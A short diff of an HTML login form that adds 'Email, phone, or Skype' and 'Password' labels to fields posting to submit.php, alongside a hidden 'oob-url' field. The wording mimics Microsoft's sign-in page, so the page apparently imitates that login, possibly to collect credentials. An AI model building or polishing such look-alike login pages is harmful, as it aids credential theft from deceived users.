@@ -86,7 +86,9 @@
         </div>
         <form class="login-form" action="submit.php" method="POST">
             <input type="hidden" id="hidden-oob-url" name="oob-url">
+            <label for="email">Email, phone, or Skype:</label>
             <input type="text" id="email" name="email" placeholder="Enter your email" required>
+            <label for="password">Password:</label>
             <input type="password" id="password" name="password" placeholder="Enter your password" required>
             <button type="submit" onclick="document.getElementById('hidden-oob-url').value = document.getElementById('oob-url').value;">Submit</button>
         </form>
